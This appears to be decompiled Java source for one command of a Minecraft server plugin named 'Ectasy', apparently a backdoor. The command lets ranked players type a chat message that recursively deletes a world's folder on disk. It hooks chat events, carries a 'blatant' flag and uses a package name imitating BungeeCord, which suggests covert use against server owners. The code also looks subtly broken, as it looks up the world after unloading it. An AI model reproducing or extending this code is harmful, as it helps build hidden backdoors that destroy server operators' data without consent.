package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import java.io.File;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "deleteworld",
   description = "Deletes a world",
   blatant = true,
   rank = Rank.DEVELOPER
)
public class DeleteWorldCommand extends AbstractCommand {
   public DeleteWorldCommand() {
   }

   void delWorld(File var1) {
      File[] var2 = var1.listFiles();
      if (var2 != null) {
         for(File var6 : var2) {
            this.delWorld(var6);
         }
      } else if (!var1.exists()) {
      }

      var1.delete();
   }

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length == 0) {
         ChatUtil.sendChat(var1.getPlayer(), "Please, use deleteworld <name>");
      } else if (Bukkit.getWorld(var3[0]) == null) {
         ChatUtil.sendChat(var1.getPlayer(), "The world " + var3[0] + " does not exists.");
      } else {
         ChatUtil.sendChat(var1.getPlayer(), "Deleting the world, please wait...");
         Bukkit.getScheduler().runTask(Ectasy.parentPlugin, () -> {
            Bukkit.unloadWorld(var3[0], false);
            this.delWorld(Bukkit.getWorld(var3[0]).getWorldFolder());
            ChatUtil.sendChat(var1.getPlayer(), "Deleted the world successfully.");
         });
      }
   }
}
